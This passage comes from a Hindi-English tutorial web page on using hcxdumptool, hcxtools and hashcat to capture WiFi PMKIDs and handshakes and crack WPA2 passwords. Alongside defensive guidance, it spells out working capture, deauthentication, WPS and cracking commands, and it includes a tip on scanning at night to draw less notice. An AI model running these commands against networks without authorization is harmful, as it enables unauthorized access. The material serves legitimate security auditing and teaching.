        <strong className="text-white">Case Study 1 — Corporate WiFi Audit:</strong> एक company ने authorized pentest में tester ने hcxdumptool से office building के सभी WiFi networks scan किए। 15 minutes में 8 access points के PMKID capture हुए। इनमें से 3 APs पर weak passwords थे — hashcat से 2 घंटे में crack हो गए। एक guest network पर WPA3 transition mode था — PMKID attack fail हुआ लेकिन WPA2 fallback से handshake capture हुआ। Company ने सभी APs को WPA3 में upgrade किया और strong passwords set किए।
      </p>
      <p>
        <strong className="text-white">Case Study 2 — Home Network Security Test:</strong> एक security enthusiast ने अपने home router की security test की। hcxdumptool से PMKID capture हुआ — router manufacturer ने firmware update में PMKID disable नहीं किया था। Dictionary attack से password crack नहीं हुआ (strong password था)। लेकिन PMKID leak का मतलब था कि कोई भी attacker hash capture कर सकता था। User ने WPA3 enable किया और manufacturer को report किया।
      </p>
      <p>
        <strong className="text-white">Case Study 3 — WiFi Pineapple Alternative:</strong> Red team के पास WiFi Pineapple budget में नहीं था। hcxdumptool + Raspberry Pi + Alfa adapter से DIY WiFi audit kit बनाया। Automated script लिखा जो PMKID capture, hcxpcapngtool conversion, और hashcat cracking एक साथ करता था। 3 office locations audit किए — 50+ APs test हुए, 12 weak passwords मिले। Total cost: $50 (Pi + adapter) vs $1000+ (WiFi Pineapple)।
      </p>
      <p>
        <strong className="text-white">Case Study 4 — WPA3 Migration Verification:</strong> एक enterprise ने WPA2 से WPA3 में migration की। Verification के लिए tester ने hcxdumptool से सभी APs test किए। 200 APs में से 185 पर PMKID attack fail हुआ (WPA3-SAE enabled)। लेकिन 15 APs पर legacy devices की वजह से WPA2 fallback enable था — उन पर PMKID capture हुआ। Company ने legacy devices को isolate किया और dedicated VLAN में move किया।
      </p>

      <h2>Integration with Other Tools</h2>
      <p>
        hcxdumptool + hcxtools suite + hashcat = complete WiFi cracking pipeline। लेकिन दूसरे tools के साथ integrate करने से और भी powerful workflows बनते हैं:
      </p>
      <CodeBlock
        title="WiFi Attack Pipeline Integration"
        code={`# hcxdumptool + Wifite (automated):
# Wifite internally hcxdumptool use करता है PMKID capture के लिए
sudo wifite --pmkid --pmkid-timeout 120
# Automated: capture → convert → crack

# hcxdumptool + Aircrack-ng (CPU cracking):
sudo hcxdumptool -i wlan0mon -o capture.pcapng
aircrack-ng capture.pcapng -w /usr/share/wordlists/rockyou.txt

# hcxdumptool + John the Ripper:
hcxpcapngtool -o hash_john.txt capture.pcapng
john --wordlist=wordlist.txt hash_john.txt

# hcxdumptool + Bettercap:
# Bettercap WiFi module + hcxdumptool PMKID combo:
sudo bettercap -iface wlan0mon
# > wifi.recon on
# > wifi.show
# अलग terminal: sudo hcxdumptool -i wlan0mon -o capture.pcapng

# hcxdumptool + Nmap (post-crack):
# WiFi password crack करने के बाद network scan:
nmap -sn 192.168.1.0/24
# Connected devices discover करो

# hcxdumptool + Reaver (WPS attack):
# PMKID fail हो तो WPS try करो:
sudo hcxdumptool -i wlan0mon -o capture.pcapng
# अगर PMKID नहीं मिला:
sudo reaver -i wlan0mon -b AA:BB:CC:DD:EE:FF`}
      />

      <h2>Performance Tuning</h2>
      <p>
        hcxdumptool को maximize करने के लिए optimization tips:
      </p>
      <ul className="list-disc list-inside text-gray-300 mb-4 space-y-2">
        <li><strong className="text-white">Channel Selection:</strong> --channel=1,6,11 से specific channels scan करो — faster results, 2.4GHz के main channels</li>
        <li><strong className="text-white">Target Filtering:</strong> --filterlist_ap + --filtermode=2 से specific targets — noise कम, speed ज़्यादा</li>
        <li><strong className="text-white">USB 3.0 Port:</strong> WiFi adapter USB 3.0 में लगाओ — data transfer rate better</li>
        <li><strong className="text-white">Capture Duration:</strong> --stop_client_m2_assocs=120 — 2 minutes per target, then move on</li>
        <li><strong className="text-white">Disable Unnecessary Features:</strong> --disable_client_octets=1 से client fingerprinting skip — faster</li>
        <li><strong className="text-white">Hashcat GPU:</strong> hashcat -m 22000 --force से GPU cracking enable — RTX cards पर 1M+ hashes/sec</li>
        <li><strong className="text-white">Wordlist Optimization:</strong> hcxpsktool से target-specific wordlist बनाओ — smaller wordlist = faster crack</li>
        <li><strong className="text-white">Multiple Adapters:</strong> दो Alfa adapters use करो — एक 2.4GHz, एक 5GHz — dual-band coverage</li>
      </ul>

      <h2>Reporting and Output Analysis</h2>
      <p>
        WiFi audit results को properly document करना important है — client report और remediation tracking के लिए:
      </p>
      <CodeBlock
        title="WiFi Audit Reporting"
        code={`# Capture statistics:
hcxpcapngtool capture.pcapng | head -20
# PMKID count, handshake count, ESSID list दिखेगा

# Detailed capture info:
hcxpcapngtool capture.pcapng --info=0
# हर captured hash की details — BSSID, ESSID, type

# Hash file analysis:
wc -l hash.hc22000
grep -c "WPA\\*02" hash.hc22000  # PMKID count
grep -c "WPA\\*01" hash.hc22000  # Handshake count

# Crack results summary:
hashcat -m 22000 hash.hc22000 --show > cracked.txt
wc -l cracked.txt
echo "Cracked: $(wc -l < cracked.txt) / $(wc -l < hash.hc22000)"

# Report generation script:
#!/bin/bash
echo "=== WiFi Security Audit Report ===" > report.txt
echo "Date: $(date)" >> report.txt
echo "Target Area: Office Building" >> report.txt
echo "" >> report.txt
echo "--- Access Points Scanned ---" >> report.txt
hcxpcapngtool capture.pcapng --info=0 | grep ESSID >> report.txt
echo "" >> report.txt
echo "--- PMKIDs Captured ---" >> report.txt
grep -c "WPA\\*02" hash.hc22000 >> report.txt
echo "" >> report.txt
echo "--- Handshakes Captured ---" >> report.txt
grep -c "WPA\\*01" hash.hc22000 >> report.txt
echo "" >> report.txt
echo "--- Cracked Passwords ---" >> report.txt
hashcat -m 22000 hash.hc22000 --show >> report.txt
echo "" >> report.txt
echo "--- Recommendations ---" >> report.txt
echo "1. Enable WPA3-SAE on all APs" >> report.txt
echo "2. Use 12+ character passwords" >> report.txt
echo "3. Enable 802.11w (PMF)" >> report.txt
echo "4. Disable WPS" >> report.txt`}
      />

      <h2>Comparison with Other Tools</h2>
      <div className="overflow-x-auto">
        <table className="w-full text-sm">
          <thead>
            <tr className="border-b border-neon-green/30">
              <th className="text-left py-2 px-3 text-neon-green">फ़ीचर</th>
              <th className="text-left py-2 px-3 text-neon-green">hcxdumptool</th>
              <th className="text-left py-2 px-3 text-neon-green">airodump-ng</th>
              <th className="text-left py-2 px-3 text-neon-green">Wifite</th>
              <th className="text-left py-2 px-3 text-neon-green">Bettercap</th>
            </tr>
          </thead>
          <tbody className="text-gray-400">
            <tr className="border-b border-dark-600"><td className="py-2 px-3 text-white">PMKID Capture</td><td className="py-2 px-3">हाँ (primary feature)</td><td className="py-2 px-3">नहीं</td><td className="py-2 px-3">हाँ (via hcxdumptool)</td><td className="py-2 px-3">हाँ</td></tr>
            <tr className="border-b border-dark-600"><td className="py-2 px-3 text-white">Handshake Capture</td><td className="py-2 px-3">हाँ</td><td className="py-2 px-3">हाँ (primary)</td><td className="py-2 px-3">हाँ</td><td className="py-2 px-3">हाँ</td></tr>
            <tr className="border-b border-dark-600"><td className="py-2 px-3 text-white">Active Injection</td><td className="py-2 px-3">हाँ (raw socket)</td><td className="py-2 px-3">नहीं (passive only)</td><td className="py-2 px-3">हाँ</td><td className="py-2 px-3">हाँ</td></tr>
            <tr className="border-b border-dark-600"><td className="py-2 px-3 text-white">Client-less Attack</td><td className="py-2 px-3">हाँ (PMKID)</td><td className="py-2 px-3">नहीं</td><td className="py-2 px-3">हाँ</td><td className="py-2 px-3">हाँ</td></tr>
            <tr className="border-b border-dark-600"><td className="py-2 px-3 text-white">GUI</td><td className="py-2 px-3">नहीं (CLI only)</td><td className="py-2 px-3">CLI</td><td className="py-2 px-3">CLI (automated)</td><td className="py-2 px-3">CLI + Web UI</td></tr>
            <tr className="border-b border-dark-600"><td className="py-2 px-3 text-white">Ease of Use</td><td className="py-2 px-3">Intermediate</td><td className="py-2 px-3">Easy</td><td className="py-2 px-3">Easy (automated)</td><td className="py-2 px-3">Intermediate</td></tr>
            <tr className="border-b border-dark-600"><td className="py-2 px-3 text-white">Speed</td><td className="py-2 px-3">बहुत तेज़ (C, raw socket)</td><td className="py-2 px-3">मध्यम</td><td className="py-2 px-3">मध्यम</td><td className="py-2 px-3">तेज़</td></tr>
            <tr className="border-b border-dark-600"><td className="py-2 px-3 text-white">Hashcat Format</td><td className="py-2 px-3">22000 (native)</td><td className="py-2 px-3">2500 (old)</td><td className="py-2 px-3">22000</td><td className="py-2 px-3">22000</td></tr>
            <tr><td className="py-2 px-3 text-white">Dependencies</td><td className="py-2 px-3">Minimal (standalone)</td><td className="py-2 px-3">Aircrack-ng suite</td><td className="py-2 px-3">Multiple tools</td><td className="py-2 px-3">Go binary</td></tr>
          </tbody>
        </table>
      </div>

      <h2>Common Problems and Solutions</h2>
      <div className="space-y-3 mt-4">
        {[
          { q: 'PMKID नहीं मिल रहा', a: 'Target AP PMKID support नहीं करता — कुछ पुराने राउटर्स में PMKID disabled होता है। Traditional handshake attack try करो: airodump-ng + deauth। दूसरे APs try करो — ~60% modern APs PMKID support करते हैं।' },
          { q: 'Interface error — device busy', a: 'NetworkManager/wpa_supplicant interfere कर रहा है। sudo airmon-ng check kill करो पहले। फिर monitor mode set करो। rfkill list से check करो कि WiFi blocked तो नहीं।' },
          { q: 'Capture file empty है', a: 'WiFi adapter monitor mode में नहीं है। iwconfig से check करो। अगर managed mode है तो: sudo iw dev wlan0 set type monitor करो। Adapter monitor mode support नहीं करता — external adapter use करो।' },
          { q: 'Permission denied error', a: 'Root access चाहिए। sudo से run करो। ya root user बन जाओ: sudo su। Docker में --privileged flag ज़रूरी है।' },
          { q: 'hcxpcapngtool conversion fail', a: 'Capture file corrupt हो सकती है या empty है। दोबारा capture करो। ls -la से check करो कि file size > 0 है। --info=0 flag से capture content check करो।' },
          { q: 'WiFi adapter support नहीं करता', a: 'Monitor mode capable adapter चाहिए। Alfa AWUS036ACH (Realtek RTL8812AU) best है। TP-Link TL-WN722N v1 (Atheros) भी अच्छा है। Internal laptop WiFi cards generally support नहीं करते।' },
          { q: 'Very slow capture', a: 'Channel hopping optimize करो — --channel flag से specific channels set करो (1,6,11)। --filtermode=2 से target filter करो। WiFi adapter USB 3.0 port में लगाओ।' },
          { q: 'Multiple PMKIDs captured — कौन सा target?', a: 'hcxpcapngtool --info=0 से check करो — हर hash के साथ ESSID और BSSID दिखेगा। --filterlist_ap से specific target set करो।' },
        ].map((item, i) => (
          <div key={i} className="glass-card p-4">
            <h4 className="text-white font-mono font-semibold mb-2">Q: {item.q}</h4>
            <p className="text-gray-400 text-sm">A: {item.a}</p>
          </div>
        ))}
      </div>

      <h2>Detection and Defense</h2>
      <p>
        PMKID attacks से कैसे बचें — WiFi network hardening guide:
      </p>
      <ul className="list-disc list-inside text-gray-300 mb-4 space-y-2">
        <li><strong className="text-white">WPA3 Enable करें:</strong> WPA3-SAE PMKID attacks prevent करता है — SAE handshake completely different है और PMKID leak नहीं होता। सबसे effective defense।</li>
        <li><strong className="text-white">Strong Password:</strong> 12+ characters, uppercase, lowercase, numbers, symbols — dictionary attack रोकेगा। Common passwords (password123, admin) कभी मत use करो।</li>
        <li><strong className="text-white">802.11w (PMF):</strong> Protected Management Frames enable करें — deauth attacks prevent होंगे। Modern routers support करते हैं।</li>
        <li><strong className="text-white">Firmware Update:</strong> राउटर firmware regularly update करें — PMKID leak patches manufacturers release करते हैं।</li>
        <li><strong className="text-white">Rogue AP Detection:</strong> Wireless IDS/IPS use करें — unauthorized access points और suspicious authentication attempts detect होंगे।</li>
        <li><strong className="text-white">MAC Filtering:</strong> Extra layer — bypass हो सकता है लेकिन basic attackers रोकेगा। Allowed devices की whitelist बनाओ।</li>
        <li><strong className="text-white">Network Monitoring:</strong> Suspicious authentication attempts monitor करें — log analysis से attack detect होता है।</li>
        <li><strong className="text-white">Disable WPS:</strong> WPS brute force attacks भी common हैं — WPS disable रखें।</li>
        <li><strong className="text-white">RADIUS Authentication:</strong> Enterprise WPA2/WPA3 use करो — PMKID attack नहीं काम करता।</li>
        <li><strong className="text-white">Client Isolation:</strong> AP client isolation enable करो — clients आपस में communicate नहीं कर सकते।</li>
      </ul>
      <p>
        WiFi security layers में काम करती है — कोई single defense sufficient नहीं है। WPA3 + strong password + PMF + monitoring = comprehensive protection। Regular security audits करो — authorized testing से vulnerabilities पहले पता चलती हैं। WiFi security ongoing process है — new vulnerabilities continuously discover होते हैं, defenses update करते रहो।
      </p>
      <p>
        Enterprise environments में WPA2/WPA3-Enterprise (RADIUS) use करो — PMKID attack completely ineffective है enterprise authentication के against। RADIUS server per-user credentials verify करता है — shared password concept eliminate होता है। 802.1X authentication strong security layer add करता है। Certificate-based authentication और identity-based access control implement करो।
      </p>
      <p>
        Wireless IDS/IPS deploy करो — rogue AP detection, deauth flood detection, evil twin detection। Products like Kismet (server mode), Wireshark (monitoring), ya commercial WIDS solutions use करो। Automated alerts set करो suspicious activity के लिए — real-time response possible होगा। Network segmentation भी important है — WiFi network को critical infrastructure से isolate करो, VLANs use करो, firewall rules implement करो।
      </p>

      <h2>Lab Environment Setup</h2>
      <p>
        WiFi security testing practice के लिए safe lab बनाओ — केवल अपने equipment पर test करो। Lab environment isolate रखो — home network से physically disconnect करो। Dedicated VLAN ya completely separate network use करो। Air-gapped lab best है — कोई Internet access नहीं, कोई external connectivity नहीं।
      </p>
      <p>
        Lab setup के लिए minimum 2 devices चाहिए — एक AP (target) और एक WiFi adapter (attacker)। Optional: client device (phone/laptop) handshake capture practice के लिए। Multiple routers different brands के test करो — हर manufacturer का PMKID behavior different हो सकता है। Budget lab: $50-100 में complete setup बन जाता है।
      </p>
      <CodeBlock
        title="WiFi Security Lab Setup"
        code={`# ज़रूरी सामान:
# 1. Monitor mode capable WiFi adapter (Alfa AWUS036ACH recommended)
# 2. Old WiFi router (test target — बाज़ार से सस्ता वाला)
# 3. Kali Linux / Nethunter machine
# 4. Optional: Raspberry Pi (dedicated attack machine)

# Router setup:
# - Router factory reset करो
# - WPA2-Personal set करो
# - Known password रखो (test के लिए — जैसे "TestPass123")
# - PMKID support check करो (default ON in most routers)

# Practice workflow:
# 1. Monitor mode enable करो
# 2. hcxdumptool से PMKID capture करो
# 3. hcxpcapngtool से convert करो
# 4. hashcat से crack करो
# 5. Router settings change करके दोबारा test करो
#    - WPA3 enable → PMKID attack fail होना चाहिए
#    - Strong password → dictionary attack fail होना चाहिए

# Advanced lab:
# - Multiple routers (different brands)
# - Different security settings (WPA, WPA2, WPA3)
# - Client devices (phones, laptops) connect करो
# - Handshake capture practice करो

# Legal reminder:
# केवल अपने router पर test करो
# Lab environment isolate रखो (air-gapped)
# कभी भी neighbor's WiFi पर test मत करो

# Hardware recommendations:
# Budget: TP-Link TL-WN722N v1 (~$15) — 2.4GHz only
# Mid-range: Alfa AWUS036NHA (~$30) — better range
# Premium: Alfa AWUS036ACH (~$50) — dual-band, best
# Raspberry Pi 4: Dedicated attack platform (~$40)
# Total budget lab: ~$60-120

# Lab environment best practices:
# - Dedicated VLAN for lab (home network से isolate)
# - No Internet access to lab router (air-gapped)
# - Document all tests — results, configs, passwords
# - Practice time: 2-3 hours daily for 1 month = proficiency`}
      />

      <h2>WPA3-SAE Testing</h2>
      <p>
        WPA3-SAE (Simultaneous Authentication of Equals) PMKID attack prevent करता है। लेकिन testing ज़रूरी है — कुछ APs WPA3 transition mode में vulnerable हो सकते हैं:
      </p>
      <CodeBlock
        title="WPA3 Security Testing"
        code={`# WPA3-SAE AP detect करो:
sudo airodump-ng wlan0mon | grep "SAE"

# WPA3 AP पर PMKID attack try करो:
sudo hcxdumptool -i wlan0mon -o wpa3_test.pcapng --enable_status=1
# Expected result: PMKID capture नहीं होगा (WPA3-SAE)

# Mixed mode (WPA2/WPA3 transition) test:
# कुछ APs transition mode में WPA2 fallback allow करते हैं
# उन पर PMKID attack possible हो सकता है
sudo hcxdumptool -i wlan0mon -o mixed_mode.pcapng --enable_status=1

# PMF (Protected Management Frames) test:
# 802.11w enable APs पर deauth attack fail होना चाहिए
sudo hcxdumptool -i wlan0mon -o pmf_test.pcapng --disable_deauthentication=0

# Transition Disable check:
# कुछ clients transition mode disable कर सकते हैं
# यह check करता है कि AP properly WPA3 enforce कर रहा है

# Security assessment checklist:
# 1. PMKID attack fail → WPA3-SAE properly enabled
# 2. Deauth fail → PMF (802.11w) enabled
# 3. No WPA2 fallback → transition mode disabled
# 4. Strong password → dictionary attack fail
# 5. WPS disabled → pixie dust attack fail

# WPA3 migration report template:
echo "=== WPA3 Migration Audit ===" > wpa3_report.txt
echo "Date: $(date)" >> wpa3_report.txt
echo "" >> wpa3_report.txt
echo "Access Points Scanned: [count]" >> wpa3_report.txt
echo "WPA3-SAE Enabled: [count]" >> wpa3_report.txt
echo "WPA2 Only: [count]" >> wpa3_report.txt
echo "Mixed Mode (Vulnerable): [count]" >> wpa3_report.txt
echo "PMKID Captured: [count]" >> wpa3_report.txt
echo "Handshake Captured: [count]" >> wpa3_report.txt
echo "" >> wpa3_report.txt
echo "Recommendations:" >> wpa3_report.txt
echo "1. Upgrade all APs to WPA3-SAE" >> wpa3_report.txt
echo "2. Disable WPA2 transition mode" >> wpa3_report.txt
echo "3. Enable 802.11w (PMF)" >> wpa3_report.txt
echo "4. Use 14+ character passwords" >> wpa3_report.txt
echo "5. Disable WPS on all APs" >> wpa3_report.txt`}
      />
      <h2>Advanced Techniques</h2>
      <CodeBlock
        title="Advanced WiFi Attack Techniques"
        code={`# Channel hopping — सभी channels scan:
sudo hcxdumptool -i wlan0mon -o capture.pcapng --enable_status=1
# Automatically all 2.4GHz channels scan होंगे

# Specific channels only (faster):
sudo hcxdumptool -i wlan0mon -o capture.pcapng --channel=1,6,11

# Deauth + PMKID combo (aggressive):
sudo hcxdumptool -i wlan0mon -o capture.pcapng --disable_deauthentication=0
# Clients disconnect होंगे → reconnect → handshake capture

# Passive capture (stealthy — no injection):
sudo hcxdumptool -i wlan0mon -o capture.pcapng --disable_client_octets=1
# सिर्फ capture करेगा, कोई frame inject नहीं करेगा

# Multiple output files (per target):
sudo hcxdumptool -i wlan0mon --prefix_outfile=scan --enable_status=1

# Time-based capture (5 minutes = 300 seconds):
sudo hcxdumptool -i wlan0mon -o capture.pcapng --stop_client_m2_assocs=300

# ESSID-based target (network name से):
echo "TargetNetwork" > essid.txt
sudo hcxdumptool -i wlan0mon -o capture.pcapng --essidlist=essid.txt --filtermode=2

# Combined approach (best results):
# 1. PMKID capture (60 sec)
# 2. Handshake capture (120 sec)
# 3. hcxpcapngtool convert
# 4. hashcat crack (both hashes)

# hcxtools suite other tools:
# hcxpsktool — PSK wordlist generator
hcxpsktool -o wordlist.txt --digitlength=8 --passwordlength=8

# hcxhash2cap — hash to pcap converter
hcxhash2cap -o converted.pcapng hash.hc22000

# hcxwltool — wordlist from ESSID
hcxwltool -o wordlist.txt essid_list.txt`}
      />

      <h2>Frequently Asked Questions</h2>
      <div className="space-y-3 mt-4">
        {[
          { q: 'क्या सभी राउटर्स PMKID support करते हैं?', a: 'नहीं। लगभग 60% मॉडर्न राउटर्स PMKID enable रखते हैं। पुराने राउटर्स में यह feature नहीं होता। कुछ manufacturers ने firmware update से disable कर दिया है। PMKID fail हो तो traditional handshake attack try करो।' },
          { q: 'Client-less attack कैसे possible है?', a: 'जब आप AP को authentication request भेजते हो, तो AP EAPOL frame में PMKID respond करता है। यह PMKID = HMAC-SHA1-128(PMK, "PMK Name", MAC_AP, MAC_STA) से derived होता है। PMK password से बनता है — इसलिए offline crack possible है।' },
          { q: 'WPA3 में PMKID attack काम करता है?', a: 'नहीं। WPA3-SAE (Simultaneous Authentication of Equals) different handshake use करता है जिसमें PMKID leak नहीं होता। WPA3 upgrade सबसे अच्छा defense है। हालांकि WPA3 transition mode (WPA2/WPA3 mixed) में PMKID attack possible हो सकता है।' },
          { q: 'Monitor mode adapter कौन सा लें?', a: 'Alfa AWUS036ACH (dual-band, AC1200, Realtek RTL8812AU) सबसे popular है। TP-Link TL-WN722N v1 (Atheros AR9271) budget option है। Internal laptop WiFi cards generally monitor mode support नहीं करते — external USB adapter ज़रूरी है।' },
          { q: 'PMKID vs Handshake — कौन better है?', a: 'PMKID faster है (client नहीं चाहिए) लेकिन सभी APs support नहीं करते (~60%)। Handshake reliable है लेकिन client चाहिए (~95% success)। Best approach: पहले PMKID try करो, fail हो तो handshake try करो। दोनों methods combine करने से maximum success rate मिलती है।' },
          { q: 'hcxdumptool vs airodump-ng — कौन better?', a: 'PMKID capture के लिए hcxdumptool best है — raw socket access, faster, client-less। General scanning और handshake capture के लिए airodump-ng better है — GUI-like output, easy to use। Ideal workflow: दोनों use करो — hcxdumptool PMKID के लिए, airodump-ng scanning के लिए।' },
          { q: 'क्या Windows पर चलता है?', a: 'नहीं। hcxdumptool सिर्फ Linux पर चलता है — raw socket access चाहिए जो Windows में possible नहीं। Kali Linux, Parrot OS, या Nethunter use करो। VM में WiFi adapter pass-through करना पड़ेगा।' },
          { q: 'Capture file में multiple APs के hashes — separate कैसे करें?', a: 'hcxpcapngtool automatic separate करता है। --info=0 flag से detailed info मिलती है। Individual hashes extract करने के लिए --all flag use करो। ya specific BSSID filter use करके separate captures करो।' },
          { q: '5GHz networks PMKID attack possible?', a: 'हाँ, लेकिन 5GHz capable adapter चाहिए। Alfa AWUS036ACH dual-band है — 2.4GHz + 5GHz दोनों support। --channel flag से 5GHz channels (36, 40, 44, 48, etc.) specify करो। 5GHz पर range कम होती है।' },
          { q: 'Kernels updates से hcxdumptool break होता है?', a: 'कभी-कभी। Kernel update के बाद WiFi driver module recompile होना चाहिए। apt upgrade के बाद hcxdumptool test करो। अगर काम न करे: driver reinstall करो ya kernel headers install करो।' },
          { q: 'Multiple WiFi adapters simultaneously use कर सकते हैं?', a: 'हाँ, लेकिन अलग-अलग interfaces specify करो: hcxdumptool -i wlan0mon और दूसरे terminal में hcxdumptool -i wlan1mon। Same adapter पर दो instances नहीं चल सकते।' },
          { q: 'Hashcat "No hashes loaded" error?', a: 'Format wrong है। --info=0 से hash type check करो। Mode 22000 (new) vs 16800 (old) verify करो। hcxpcapngtool conversion properly हुई check करो। Empty hash file = capture में PMKID/handshake नहीं मिला।' },
          { q: 'WiFi adapter monitor mode support नहीं करता?', a: 'Internal laptop cards generally support नहीं करते। External USB adapter लो: Alfa AWUS036ACH (best), TP-Link TL-WN722N v1 (budget)। iw list command से check करो: * monitor mode list में होना चाहिए।' },
          { q: 'Capture rate बहुत slow है?', a: '--channel=1,6,11 से main channels only scan करो। --filterlist_ap से target set करो। USB 3.0 port use करो। WiFi adapter antenna check करो। Physical location change करो — closer to APs = better signal।' },
          { q: 'PMKID capture हुआ लेकिन hashcat crack नहीं कर पा रहा?', a: 'Wordlist problem है — rockyou.txt try करो। GPU driver update करो। Hash format verify करो --info=0 से। Mask attack try करो: hashcat -m 22000 hash.hc22000 -a 3 ?a?a?a?a?a?a?a?a (8 char all chars)। Rule-based attack भी effective है।' },
          { q: 'Multiple adapters same time use कर सकते हैं?', a: 'हाँ, अलग-अलग interfaces: wlan0mon और wlan1mon। दोनों पर parallel capture करो — different channels cover होंगे। Same adapter पर दो instances नहीं चल सकते — conflict होगा।' },
          { q: 'Capture file corrupt हो गया?', a: 'hcxpcapngtool --help से repair options check करो। Partial captures भी usable हो सकते हैं — hcxpcapngtool automatically handle करता है। Disk space check करो — full disk = corrupt file। Capture directory /tmp में न रखो — RAM disk, reboot पर data loss।' },
          { q: 'Legal consequences क्या हैं unauthorized testing के?', a: 'India में IT Act 2000 Section 43 और 66 — unauthorized network access = 3 years jail + 5 lakh fine। US में CFAA — 5-20 years। Always get written authorization। Own equipment पर testing legal है। Public WiFi testing unauthorized = crime।' },
        ].map((item, i) => (
          <div key={i} className="glass-card p-4">
            <h4 className="text-white font-mono font-semibold mb-2">Q: {item.q}</h4>
            <p className="text-gray-400 text-sm">A: {item.a}</p>
          </div>
        ))}
      </div>

      <h2>WiFi Adapter Selection</h2>
      <p>
        hcxdumptool के लिए सही WiFi adapter बहुत important है। सभी adapters monitor mode और packet injection support नहीं करते। Realtek RTL8812AU chipset best results देता है। Alfa adapters community में popular हैं। Internal laptop WiFi cards generally support नहीं करते — external USB adapter ज़रूरी है।
      </p>
      <ul className="list-disc list-inside text-gray-300 mb-4 space-y-2">
        <li><strong className="text-white">Alfa AWUS036ACH:</strong> RTL8812AU, dual-band, excellent range, Linux support best</li>
        <li><strong className="text-white">Alfa AWUS036NHA:</strong> Atheros AR9271, 2.4GHz only, proven reliability</li>
        <li><strong className="text-white">Panda PAU09:</strong> RT5572, budget option, decent performance</li>
        <li><strong className="text-white">TP-Link TL-WN722N v1:</strong> Atheros AR9271, cheap but v2/v3 different chipset — avoid those</li>
        <li><strong className="text-white">5GHz Support:</strong> RTL8812AU based adapters 5GHz support करते हैं — WPA3 testing के लिए ज़रूरी</li>
        <li><strong className="text-white">External Antenna:</strong> RP-SMA connector वाले adapters external antenna support करते हैं — range significantly बढ़ती है</li>
      </ul>

      <h2>Alternatives</h2>
      <div className="overflow-x-auto">
        <table className="w-full text-sm">
          <thead>
            <tr className="border-b border-neon-green/30">
              <th className="text-left py-2 px-3 text-neon-green">टूल</th>
              <th className="text-left py-2 px-3 text-neon-green">क्या करता है</th>
              <th className="text-left py-2 px-3 text-neon-green">खासियत</th>
              <th className="text-left py-2 px-3 text-neon-green">PMKID Support</th>
            </tr>
          </thead>
          <tbody className="text-gray-400">
            <tr className="border-b border-dark-600"><td className="py-2 px-3 text-white font-mono">airodump-ng</td><td className="py-2 px-3">WiFi scanning + handshake capture</td><td className="py-2 px-3">Aircrack-ng suite का classic tool</td><td className="py-2 px-3">नहीं</td></tr>
            <tr className="border-b border-dark-600"><td className="py-2 px-3 text-white font-mono">Wifite</td><td className="py-2 px-3">Automated WiFi attack framework</td><td className="py-2 px-3">hcxdumptool integrate करता है</td><td className="py-2 px-3">हाँ</td></tr>
            <tr className="border-b border-dark-600"><td className="py-2 px-3 text-white font-mono">Bettercap</td><td className="py-2 px-3">MITM + WiFi + BLE attacks</td><td className="py-2 px-3">Comprehensive attack framework</td><td className="py-2 px-3">हाँ</td></tr>
            <tr className="border-b border-dark-600"><td className="py-2 px-3 text-white font-mono">Hashcat</td><td className="py-2 px-3">Password cracking (GPU accelerated)</td><td className="py-2 px-3">hcxdumptool capture + hashcat crack combo</td><td className="py-2 px-3">Cracking only</td></tr>
            <tr className="border-b border-dark-600"><td className="py-2 px-3 text-white font-mono">hcxtools suite</td><td className="py-2 px-3">WiFi analysis toolkit</td><td className="py-2 px-3">hcxpcapngtool, hcxpsktool, etc.</td><td className="py-2 px-3">हाँ (full suite)</td></tr>
            <tr className="border-b border-dark-600"><td className="py-2 px-3 text-white font-mono">EAPHammer</td><td className="py-2 px-3">WPA-Enterprise attacks</td><td className="py-2 px-3">Evil twin, credential capture</td><td className="py-2 px-3">नहीं</td></tr>
            <tr><td className="py-2 px-3 text-white font-mono">Airgeddon</td><td className="py-2 px-3">WiFi attack automation</td><td className="py-2 px-3">Menu-driven, multiple attacks</td><td className="py-2 px-3">हाँ (via hcxdumptool)</td></tr>
            <tr className="border-b border-dark-600"><td className="py-2 px-3 text-white font-mono">Fern WiFi Cracker</td><td className="py-2 px-3">GUI-based WiFi cracking</td><td className="py-2 px-3">Python GUI, beginner friendly</td><td className="py-2 px-3">नहीं</td></tr>
            <tr><td className="py-2 px-3 text-white font-mono">Kismet</td><td className="py-2 px-3">Wireless IDS + sniffer</td><td className="py-2 px-3">Passive monitoring, drone support</td><td className="py-2 px-3">नहीं (monitoring only)</td></tr>
          </tbody>
        </table>
      </div>

      <div className="info-box mt-6">
        <strong>💡 Pro Tips:</strong>
        <ul className="list-disc list-inside mt-2 space-y-1">
          <li>PMKID attack बहुत effective है क्योंकि client की ज़रूरत नहीं — पहले यह try करो</li>
          <li>hcxdumptool + hcxpcapngtool + hashcat combo से WiFi password crack करो — 3 commands में काम हो जाता है</li>
          <li>हमेशा दोनों methods try करो — PMKID पहले, handshake बाद में</li>
          <li>Strong password (12+ chars, mixed) dictionary attack से बचाता है</li>
          <li>External WiFi adapter (Alfa) mandatory है — internal card monitor mode support नहीं करता</li>
          <li>--filtermode=2 से specific target पर focus करो — faster results</li>
          <li>WPA3 upgrade करो — PMKID attack completely block हो जाएगा</li>
          <li>hcxpsktool से custom wordlist बनाओ — target-specific passwords generate करो</li>
          <li>USB 3.0 port use करो WiFi adapter के लिए — data transfer rate better होगी</li>
          <li>Dual-band adapter (Alfa AWUS036ACH) लो — 2.4GHz + 5GHz दोनों cover होंगे</li>
          <li>--stop_client_m2_assocs=120 flag use करो — per target time limit, faster scanning</li>
          <li>Monitor mode iwconfig से set करो: iwconfig wlan0 mode monitor — airmon-ng alternative</li>
          <li>Physical location change करो scanning के दौरान — different APs different locations से visible</li>
          <li>Capture file daily rotate करो — large files analysis slow करते हैं</li>
          <li>Hashcat --force flag GPU issues handle करता है — OpenCL/CUDA errors fix</li>
          <li>WPA2 vs WPA3 migration audit के लिए सभी APs test करो — mixed mode vulnerabilities find होती हैं</li>
          <li>hcxhashtool से hash file filter करो — specific ESSID/BSSID target करो, noise कम</li>
          <li>PMKID + handshake दोनों same file में capture होते हैं — hcxpcapngtool automatically separate करता है</li>
          <li>Night time scanning less suspicious होता है — fewer people, less monitoring</li>
          <li>Firmware updates regularly check करो — new PMKID defenses implement होते हैं</li>
          <li>Legal authorization mandatory है — WiFi testing बिना permission illegal है, IT Act Section 43</li>
          <li>hcxhashtool से hash files merge करो — multiple captures combine करके master hash file बनाओ</li>
          <li>Cracked passwords को immediately change करो — remediation report में recommend करो</li>
          <li>WiFi adapter antenna upgrade करो — 5dBi से 9dBi, range 2x बढ़ जाएगी</li>
